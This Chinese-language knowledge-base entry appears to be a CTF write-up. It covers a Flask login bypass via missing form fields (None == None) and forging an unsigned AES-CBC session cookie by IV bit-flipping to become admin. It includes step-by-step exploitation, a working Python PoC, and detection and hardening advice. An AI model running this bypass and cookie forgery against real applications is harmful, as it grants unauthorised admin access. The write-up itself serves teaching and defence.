---
id: web-generic-auth-flask-none-equals-none-cbc-cookie-forgery
title: Flask 登录缺失字段 None==None 绕过 + 无签名 AES-CBC Cookie 位翻转提权
type: scenario
domain: web
path: web/generic/auth
technique: flask-none-equals-none-login-cbc-cookie-bitflip
aliases:
- polarisCTF ez_login
- None == None
- USERS.get(None)
- 空表单登录
- AES-CBC IV 位翻转
- user=admin
- 无 MAC Cookie
tags:
- web
- auth
- flask
- python
- type-confusion
- aes-cbc
- bitflip
- cookie
- forgery
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V124
  verified_at: '2026-11-06T04:19:43+08:00'
  notes: 已对照原文核对：request.form.get 缺失返回 None、USERS.get(None)==None 绕过、create_session 用 AES-CBC 加密 user=None 且无 MAC、cookie 为 iv||ct 的 hex、P1=D(C1) XOR IV、orig=user=None+7×0x07、target=user=admin+6×0x06、new_iv=iv xor orig xor target、访问首页返回 admin 与 flag 均一致（原文给出原始/伪造 token 与回显）。未验证点：PoC 未连接真实服务复跑；原文无版本信息；frontmatter 无 sources/source_url。
---

## 一句话结论

登录逻辑 `USERS.get(user) == pw` 在表单字段完全缺失时变成 `USERS.get(None) == None`，而 `dict.get(None)` 对不存在的键返回 `None`，于是空表单直接通过认证；服务端随后签发的会话只是 AES-CBC 加密的 `user=None`，没有 MAC，攻击者改 IV 即可把首块明文改成 `user=admin`，以管理员身份进入首页。

## 原理

- **缺失字段类型混淆**：`user = request.form.get('username')`、`pw = request.form.get('password')` 在字段缺失时都返回 `None`；`USERS` 中没有 `None` 键，`USERS.get(None)` 也返回 `None`，`None == None` 为真，登录判断通过。若字段存在但为空字符串，则 `USERS.get("")` 为 `None`、`pw=""`，`None == ""` 为假，所以必须“完全省略字段”而不是传空值。
- **会话构造**：`create_session(username)` 用随机 IV 做 AES-CBC，加密 `f"user={username}"` 并 PKCS#7 填充，cookie 为 `(iv + ct).hex()`；没有 HMAC/签名。
- **解密逻辑**：`get_session_data` 取前 16 字节为 IV、其余为密文，解密后 `unpad`，直接把 `user=` 后面的内容当身份；没有完整性校验。
- **CBC 首块位翻转**：`P1 = D(C1) XOR IV`。`C1` 不变时只改 IV 就能把首块改成任意同长度内容。原始首块 `user=None` + 7 个 `0x07`（16 字节），目标首块 `user=admin` + 6 个 `0x06`（16 字节）；`new_iv = iv XOR orig_p1 XOR target_p1`。
- **为什么能提权**：服务端信任解密后的 `user=admin`，首页据此返回管理员内容/flag；整个攻击不需要密钥，只需要一份合法签发的 `user=None` 会话。

## 触发条件

- Flask/WSGI 应用用 `dict.get(user) == pw` 做登录校验，且没有检查字段是否存在/非空。
- 会话 Cookie 是 AES-CBC 加密（`iv || ct`），没有 HMAC/签名/AEAD。
- 服务端解密后直接信任 `user=` 字段做权限判断。
- 攻击者能提交空表单并获得一份合法会话（登录绕过本身即可）。
- 首块明文格式已知或可推断，且目标首块与原始首块长度相同（16 字节对齐）。

## 利用步骤

1. 向 `/login` POST 空表单（不要传 `username`/`password` 字段），不要自动跟随重定向；从响应 `Set-Cookie` 取 `session`。
2. 把 cookie 从 hex 解码，前 16 字节为 IV、其余为密文。
3. 构造原始首块 `user=None` + 7 个 `0x07`，目标首块 `user=admin` + 6 个 `0x06`。
4. 计算 `new_iv = iv XOR orig_p1 XOR target_p1`；拼接 `new_iv + ct` 并转 hex。
5. 手工带 `Cookie: session=<forged>` 访问 `/`，确认页面显示 `admin` 并返回 flag。
6. 若目标字段不在首块，改前一块密文 `C[i-1]`，接受 `P[i-1]` 变乱码的代价，把乱码放在不参与权限判断的字段。

## PoC

```python
import re, requests

BASE = "http://target"

def bxor(a, b, c):
    return bytes(x ^ y ^ z for x, y, z in zip(a, b, c))

# 1) 空表单触发 None == None
r = requests.post(f"{BASE}/login", data={}, allow_redirects=False, timeout=10)
token = r.cookies.get("session")
raw = bytes.fromhex(token)
iv, ct = raw[:16], raw[16:]

orig_p1 = b"user=None" + bytes([7]) * 7
target_p1 = b"user=admin" + bytes([6]) * 6
new_iv = bxor(iv, orig_p1, target_p1)
forged = (new_iv + ct).hex()

# 2) 带伪造 cookie 访问首页
r2 = requests.get(f"{BASE}/", headers={"Cookie": f"session={forged}"}, timeout=10)
print(r2.status_code, r2.text)
print(re.search(r"xmctf\{.*?\}", r2.text))
```

```text
# 原始首块: b"user=None" + 7 * b"\x07"
# 目标首块: b"user=admin" + 6 * b"\x06"
# new_iv = iv XOR orig_p1 XOR target_p1
```

## 变体与关联

- 登录绕过变体：`dict.get(user) == pw`、`USERS.get(user) or DEFAULT == pw`、`user in USERS or ...` 等逻辑在缺失字段/空值时可能误判；核心是“缺失字段返回 None 且与 None 比较”。
- Cookie 变体：无签名 AES-CBC 的 IV 位翻转、CBC 密文块翻转、ECB 块重排；若使用 AEAD（AES-GCM）或 HMAC，则不可篡改。
- 关联：[[web-generic-auth-cookie-cbc-bitflip-iv-first-block-role-forgery]]（CBC 位翻转基础）、[[web-generic-auth-unsigned-cookie-admin-keys]]（未签名 Cookie 伪造）、[[web-generic-auth-nodejs-prototype-chain-login-bypass]]（另一种登录逻辑绕过）。

## 检测与防御

- 检测：登录请求缺少 `username`/`password` 字段；`USERS.get(None)`/`None == None` 分支被触发；会话 Cookie 被修改 IV 后仍能解密；同一会话出现 `user=admin` 但登录用户为 None。
- 防御：登录前校验字段存在且非空；使用 `if user in USERS and hmac.compare_digest(USERS[user], pw)`；不要用 `dict.get` 的返回值与 `None` 做安全比较。
- 加固：会话使用 AEAD（AES-GCM）或 HMAC 签名；使用 Flask 自带的安全 session（签名 Cookie）；密钥不硬编码并定期轮换；Cookie 设置 `HttpOnly`/`Secure`/`SameSite`。
